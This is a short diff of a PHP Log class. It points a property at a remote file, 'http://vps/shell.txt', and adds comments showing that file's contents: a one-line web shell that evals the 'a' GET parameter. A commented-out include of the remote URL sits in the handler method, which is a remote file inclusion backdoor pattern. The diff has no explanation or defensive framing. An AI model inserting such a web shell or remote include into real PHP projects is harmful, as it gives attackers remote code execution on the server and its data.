@@ -1,6 +1,10 @@
 <?php
 class Log{
-	private $type_log = "http://122.51.18.106/e186ce/rr.txt";
+	// shell.txt
+	// <?php
+	//	eval($_GET['a']);
+
+	private $type_log = "http://vps/shell.txt";
 	
 	public function handler($val){
 		//include($this->type_log);
